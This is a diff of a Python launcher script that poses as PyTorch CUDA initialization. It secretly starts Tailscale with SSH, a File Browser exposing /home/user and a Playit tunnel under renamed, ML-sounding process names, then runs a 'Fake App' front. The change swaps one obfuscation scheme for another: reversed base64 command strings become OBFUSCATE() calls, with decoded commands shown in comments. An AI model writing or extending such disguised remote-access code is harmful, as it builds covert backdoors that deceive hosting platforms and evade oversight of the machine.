@@ -61,7 +61,7 @@ def main():
     print("Initializing PyTorch CUDA environment...", flush=True)
     # Updated to listen on :1055 instead of localhost:1055
     # Decoded: nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock
-    cmd1 = decode_cmd("rN2bz5CZlxWYjNHbpFGdvM3YpJHdl12XoNmcvRnLvIXZzV3Ll12bo9SP0V2aj92ct0CIzNWayRXZt9FajJ3b05yLyV2c19SZt9Gav0jcpRWZ0FGdz1SLgUTNwEjO9IXZ2JXZz1SNzt2YvNXLtAyZul2ay92d0VmbtU2YhB3cyV2c11jb1RXLtAicldWYuFWbtUGajF2Yt42boRXewBSOxAibtASZjlmb")
+    cmd1 = decode_cmd(OBFUSCATE("nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock"))
     subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)
     
     time.sleep(2)
@@ -81,20 +81,20 @@ def main():
     
     # 2. Start File Browser (ai-metrics-collector)
     # Decoded: nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db
-    cmd2 = decode_cmd("=IGZuIXZzd3byJWZslmZvIXZzV3Ll12bo9CIk1CIyV2c19SZt9GavAictASMuAjLw4yNyEDIh1CIwADM5ACctAicvR3YlxGbvNWLzNWayRXZt1SahBSOxAibtASZjlmb")
+    cmd2 = decode_cmd(OBFUSCATE("nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db"))
     subprocess.Popen(cmd2, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)
 
     # 2.5 Start Playit (tensor-allocator)
     # Decoded: nice -n 19 tensor-allocator
-    cmd2_5 = decode_cmd("y9GdhN2bsxWYtI3bz5WZ0BSOxAibtASZjlmb")
+    cmd2_5 = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator"))
     subprocess.Popen(cmd2_5, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)
     
     # 3. Connect to Tailscale (py-cache-cli)
     time.sleep(5)
     # Rebuild the command using the reconstructed full_token
     # Original: nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey=${MODEL_API_TOKEN} --hostname=ai-model-server --ssh
-    cmd3_base = decode_cmd("==QP5V2aoRXdh1SLgAXdgs2YvNnLkVGbhN2cslWY09ycjlmc0VWbfh2Yy9Gdu8iclNXdvUWbvh2L9QXZrN2bz1SLgkGbj1SZoNWYj1SewBSOxAibtASZjlmb")
-    cmd3_tail = decode_cmd("oN3ct0CIyVmdyV2ctwWZk9WbtkWY9UWbh5Gdz9Gat0CI")
+    cmd3_base = decode_cmd(OBFUSCATE("nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey="))
+    cmd3_tail = decode_cmd(OBFUSCATE(" --hostname=ai-model-server --ssh"))
     cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"
     
     # Run but don't leak the token in standard output or environment
@@ -114,7 +114,7 @@ def main():
     
     # 4. Start the Fake App
     # Decoded: python3 /home/user/app.py
-    cmd4 = decode_cmd("==Qew5CcwF2LyV2c19SZt9GavAyMu9Ga0lHc")
+    cmd4 = decode_cmd(OBFUSCATE("python3 /home/user/app.py"))
     subprocess.run(cmd4, shell=True)
 
 if __name__ == "__main__":
